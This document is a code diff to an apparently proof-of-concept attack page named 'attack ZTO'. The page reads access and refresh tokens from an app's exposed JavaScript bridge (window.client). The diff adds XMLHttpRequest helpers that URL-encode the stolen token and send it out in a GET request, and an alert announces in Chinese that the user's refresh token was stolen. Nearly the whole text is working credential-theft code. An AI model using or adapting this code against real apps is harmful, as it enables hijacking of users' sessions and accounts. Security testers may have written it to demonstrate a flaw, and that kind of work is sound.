@@ -7,6 +7,44 @@
 <body>
 <p id="content">attack ZTO </p>
 <script>
+
+       function createXHR() {
+        if (typeof XMLHttpRequest != 'undefined') {
+            return new XMLHttpRequest();
+        } else if (typeof ActiveXObject != 'undefined') {
+            if (typeof arguments.callee.activeXString != 'string') {
+                var versions = ['MSXML2.XMLHttp.6.0', 'MSXML2.XMLHttp.3.0', 'MSXML2.XMLHttp'];
+                for (var i = 0; i < versions.length; i++) {
+                    try {
+                        var xhr = new ActiveXObject(versions[i]);
+                        arguments.callee.activeXString = versions[i];
+                        return xhr;
+                    } catch (ex) {
+                    }
+                }
+            }
+            return new ActiveXObject(arguments.callee.activeXString);
+        } else {
+            throw new Error('No XHR Object available');
+        }
+    }
+
+    function sendGetRequest(url, callback) {
+        var xhr = createXHR();
+        xhr.open('GET', url, false);
+        xhr.send();
+        callback(xhr.responseText);
+    }
+
+    function sendRequest(url) {
+        sendGetRequest(url, function (response) {
+            //document.getElementById("content").innerText = 'cctest : ' + response;
+        });
+    }
+    
+
+    
+    
  starZTO();   
     
  function starZTO() {
@@ -23,6 +61,12 @@
      
    var stealReToken = window.client.refreshToken();
    alert('窃取到您的refresh token:'+ stealReToken);  
+     
+   userInfo='getUserInfo : ' +stealToken;
+   document.getElementById("content").innerText = userInfo;
+   url =encodeURIComponent(userInfo);
+   sendRequest(url);
+     
 
      
  } 
